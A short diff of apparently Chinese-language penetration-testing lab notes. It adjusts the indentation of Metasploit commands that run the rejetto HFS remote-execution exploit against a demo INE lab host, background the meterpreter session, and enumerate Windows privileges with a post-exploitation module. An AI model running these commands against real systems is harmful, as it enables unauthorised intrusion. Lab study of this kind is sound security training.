@@ -7,10 +7,9 @@
 		use exploit/windows/http/rejetto_hfs_exec
 		set RHOSTS demo.ine.local
 		run
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		meterpreter > background
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	meterpreter > background
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	
 	自動列舉目前使用者權限 : 
 	use post/windows/gather/win_privs
 		set SESSION 1
